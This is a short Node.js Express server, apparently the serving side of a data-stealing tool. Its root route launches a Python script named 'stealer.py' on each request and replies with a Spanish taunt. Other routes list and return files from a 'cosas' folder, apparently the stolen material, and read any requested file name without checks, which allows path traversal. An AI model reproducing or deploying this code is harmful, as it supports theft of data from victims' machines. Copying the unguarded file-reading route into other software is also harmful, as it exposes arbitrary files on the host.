const http = require('http');

const hostname = '127.0.0.1';
const port = 3000;
const express = require('express')
var cors = require('cors');
const app = express()
const spawn = require("child_process").spawn;

app.use(cors());


app.listen(port, hostname, () => {
  console.log(`Server running at http://${hostname}:${port}/`);
});


app.get('/', (req, res) => {
    res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
    spawn('python',["./scripts/stealer.py"]);
    res.send({uo:"pillado huron"})
  })

  app.get('/list', (req, res) => {
    res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
    const fs = require('fs');
    const data = fs.readdirSync('./cosas');
    res.send({data})
  })
  app.get('/:name', (req, res) => {
    res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
    const fs = require('fs');
    const data = fs.readFileSync(`./cosas/${req.params.name}`, 'UTF-8');
    res.send(data)
  })